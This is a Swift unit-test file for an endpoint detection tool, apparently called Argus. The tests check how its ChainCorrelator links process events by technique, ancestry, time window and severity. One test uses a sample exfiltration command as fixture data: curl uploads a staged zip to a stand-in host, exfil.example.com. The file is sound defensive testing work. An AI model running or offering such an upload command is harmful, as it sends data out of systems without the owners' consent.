import XCTest
@testable import Argus

final class ChainCorrelatorTests: XCTestCase {
    private let t0 = Date(timeIntervalSince1970: 1_000_000)

    private func member(_ correlator: ChainCorrelator, pid: Int32, executable: String,
                         command: String = "", rule: String, technique: String, severity: Severity,
                         at offset: TimeInterval, ancestry: [Int32]) -> ChainDetection? {
        correlator.register(eventID: UUID(), pid: pid, executable: executable, command: command,
                             ruleNames: [rule], techniques: [technique], severity: severity,
                             timestamp: t0.addingTimeInterval(offset), ancestry: ancestry)
    }

    func testParentChildAcrossDistinctTechniquesFires() {
        let c = ChainCorrelator()
        let first = member(c, pid: 100, executable: "cmd.exe", rule: "RuleA", technique: "T1059",
                            severity: .watch, at: 0, ancestry: [])
        XCTAssertNil(first)

        let second = member(c, pid: 200, executable: "certutil.exe", rule: "RuleB", technique: "T1218",
                             severity: .elevated, at: 10, ancestry: [100])
        guard let detection = second else { return XCTFail("expected a chain detection") }
        XCTAssertEqual(Set(detection.members.map(\.pid)), [100, 200])
        XCTAssertEqual(detection.techniques, ["T1059", "T1218"])
        XCTAssertEqual(detection.members.map(\.pid), [100, 200], "members are ordered oldest-first")
    }

    func testSameRuleOnTwoProcessesDoesNotFire() {
        let c = ChainCorrelator()
        _ = member(c, pid: 100, executable: "sh", rule: "RuleA", technique: "T1059",
                   severity: .watch, at: 0, ancestry: [])
        let second = member(c, pid: 200, executable: "sh", rule: "RuleA", technique: "T1059",
                             severity: .watch, at: 10, ancestry: [100])
        XCTAssertNil(second, "same rule refiring on a retried command must not self-chain")
    }

    func testSamePidMultiRuleDoesNotFire() {
        let c = ChainCorrelator()
        _ = member(c, pid: 100, executable: "curl", rule: "RuleA", technique: "T1059",
                   severity: .watch, at: 0, ancestry: [])
        let second = member(c, pid: 100, executable: "curl", rule: "RuleB", technique: "T1218",
                             severity: .elevated, at: 1, ancestry: [])
        XCTAssertNil(second, "a single process matching multiple rules is one multi-rule event, not a chain")
    }

    func testUnrelatedTreesDoNotFire() {
        let c = ChainCorrelator()
        _ = member(c, pid: 100, executable: "curl", rule: "RuleA", technique: "T1059",
                   severity: .watch, at: 0, ancestry: [50])
        let second = member(c, pid: 200, executable: "xattr", rule: "RuleB", technique: "T1218",
                             severity: .elevated, at: 10, ancestry: [60])
        XCTAssertNil(second, "disjoint process trees must not chain")
    }

    func testLineageViaCommonNonLaunchdAncestorFires() {
        let c = ChainCorrelator()
        _ = member(c, pid: 100, executable: "curl", rule: "RuleA", technique: "T1059",
                   severity: .watch, at: 0, ancestry: [50])
        let second = member(c, pid: 200, executable: "xattr", rule: "RuleB", technique: "T1218",
                             severity: .elevated, at: 10, ancestry: [50])
        XCTAssertNotNil(second, "a shared non-launchd ancestor further up the tree still counts as related")
    }

    func testPidLessThanOrEqualOneCommonAncestorDoesNotFire() {
        let c = ChainCorrelator()
        _ = member(c, pid: 100, executable: "curl", rule: "RuleA", technique: "T1059",
                   severity: .watch, at: 0, ancestry: [1])
        let second = member(c, pid: 200, executable: "xattr", rule: "RuleB", technique: "T1218",
                             severity: .elevated, at: 10, ancestry: [1])
        XCTAssertNil(second, "launchd (pid 1) is shared by every process and must not create a chain by itself")
    }

    func testWindowExpiryPreventsChaining() {
        let c = ChainCorrelator(window: 600)
        _ = member(c, pid: 100, executable: "curl", rule: "RuleA", technique: "T1059",
                   severity: .watch, at: 0, ancestry: [])
        let second = member(c, pid: 200, executable: "xattr", rule: "RuleB", technique: "T1218",
                             severity: .elevated, at: 700, ancestry: [100])
        XCTAssertNil(second, "the first member has aged out of the rolling window")
    }

    func testThirdTechniqueJoiningRefiresWithAllThreeMembers() {
        let c = ChainCorrelator()
        _ = member(c, pid: 100, executable: "sh", rule: "RuleA", technique: "T1059",
                   severity: .watch, at: 0, ancestry: [])
        let second = member(c, pid: 200, executable: "curl", rule: "RuleB", technique: "T1105",
                             severity: .watch, at: 10, ancestry: [100])
        XCTAssertNotNil(second)

        let third = member(c, pid: 300, executable: "launchctl", rule: "RuleC", technique: "T1543",
                            severity: .elevated, at: 20, ancestry: [200, 100])
        guard let detection = third else { return XCTFail("expected a chain detection extending the prior one") }
        XCTAssertEqual(Set(detection.members.map(\.pid)), [100, 200, 300])
        XCTAssertEqual(detection.techniques, ["T1059", "T1105", "T1543"])
        XCTAssertEqual(detection.members.map(\.pid), [100, 200, 300], "oldest-first ordering")
    }

    func testSeverityEscalatesOneLevelAboveMax() {
        let c = ChainCorrelator()
        _ = member(c, pid: 100, executable: "sh", rule: "RuleA", technique: "T1059",
                   severity: .info, at: 0, ancestry: [])
        let second = member(c, pid: 200, executable: "curl", rule: "RuleB", technique: "T1105",
                             severity: .watch, at: 10, ancestry: [100])
        XCTAssertEqual(second?.escalatedSeverity, .elevated)
    }

    func testMemberCommandLinesAreCarriedIntoDetections() {
        let c = ChainCorrelator()
        _ = member(c, pid: 100, executable: "curl",
                   command: "curl -T /tmp/staging.zip https://exfil.example.com/upload",
                   rule: "RuleA", technique: "T1567", severity: .watch, at: 0, ancestry: [])
        let second = member(c, pid: 200, executable: "osascript",
                             command: "osascript -e 'display dialog \"hi\"'",
                             rule: "RuleB", technique: "T1059.002", severity: .elevated, at: 10, ancestry: [100])
        guard let detection = second else { return XCTFail("expected a chain detection") }
        XCTAssertEqual(detection.members.map(\.command),
                       ["curl -T /tmp/staging.zip https://exfil.example.com/upload",
                        "osascript -e 'display dialog \"hi\"'"],
                       "each member keeps its full command line, oldest-first")
    }

    func testSeverityEscalationCapsAtCritical() {
        let c = ChainCorrelator()
        _ = member(c, pid: 100, executable: "sh", rule: "RuleA", technique: "T1059",
                   severity: .critical, at: 0, ancestry: [])
        let second = member(c, pid: 200, executable: "curl", rule: "RuleB", technique: "T1105",
                             severity: .elevated, at: 10, ancestry: [100])
        XCTAssertEqual(second?.escalatedSeverity, .critical, "escalation must not overflow past .critical")
    }
}
